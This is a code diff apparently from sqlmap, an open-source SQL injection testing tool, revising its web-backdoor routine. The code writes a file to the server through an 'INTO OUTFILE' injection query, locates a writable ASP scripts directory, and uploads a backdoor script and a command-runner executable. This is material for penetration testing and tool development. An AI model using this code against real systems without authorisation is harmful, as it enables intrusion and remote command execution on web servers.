@@ -111,7 +111,7 @@ class Web:
 
     def __webFileInject(self, fileContent, fileName, directory):
         outFile     = posixpath.normpath("%s/%s" % (directory, fileName))
-        uplQuery    = fileContent.replace("WRITABLE_DIR", directory.replace('/', '\\\\') if kb.os == "Windows" else directory)
+        uplQuery    = fileContent.replace("WRITABLE_DIR", directory.replace('/', '\\') if kb.os == "Windows" else directory)
         query       = " LIMIT 1 INTO OUTFILE '%s' " % outFile
         query      += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
         query       = agent.prefixQuery(" %s" % query)
@@ -200,24 +200,23 @@ class Web:
             logger.info(infoMsg)
             
             if self.webApi == "asp":
-                scriptsDirectory = "Scripts"
                 runcmdName = "tmpe%s.exe" % randomStr(4)
                 runcmdStream = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_SHELL_PATH, 'runcmd.exe_'), runcmdName)
-                backdoorUploaded = False
-                for backdoorDirectoryFormat in ("%s.\%s", "%s..\%s", "%s..\..\%s"):
-                    backdoorDirectory = backdoorDirectoryFormat % (posixToNtSlashes(directory), scriptsDirectory)
-                    backdoorContent = originalBackdoorContent.replace("WRITABLE_DIR", backdoorDirectory).replace("RUNCMD_EXE", runcmdName)
-                    backdoorStream.file.truncate()
-                    backdoorStream.read()
-                    backdoorStream.seek(0)
-                    backdoorStream.write(backdoorContent)
-                    if self.__webFileStreamUpload(backdoorStream, backdoorName, backdoorDirectory):
-                        self.__webFileStreamUpload(runcmdStream, runcmdName, backdoorDirectory)
-                        self.webBackdoorUrl = "%s/%s/%s" % (self.webBaseUrl.rstrip('/'), scriptsDirectory, backdoorName)
-                        self.webDirectory = backdoorDirectory
-                        backdoorUploaded = True
-                        break
-                if not backdoorUploaded:
+                match = re.search(r'input type=hidden name=scriptsdir value="([^"]+)"', uplPage)
+                if match:
+                    backdoorDirectory = match.group(1)
+                else:
+                    continue
+                backdoorContent = originalBackdoorContent.replace("WRITABLE_DIR", backdoorDirectory).replace("RUNCMD_EXE", runcmdName)
+                backdoorStream.file.truncate()
+                backdoorStream.read()
+                backdoorStream.seek(0)
+                backdoorStream.write(backdoorContent)
+                if self.__webFileStreamUpload(backdoorStream, backdoorName, backdoorDirectory):
+                    self.__webFileStreamUpload(runcmdStream, runcmdName, backdoorDirectory)
+                    self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl.rstrip('/'), backdoorName)
+                    self.webDirectory = backdoorDirectory
+                else:
                     continue
             elif not self.__webFileStreamUpload(backdoorStream, backdoorName, posixToNtSlashes(directory) if kb.os == "Windows" else directory):
                 warnMsg  = "backdoor hasn't been successfully uploaded "
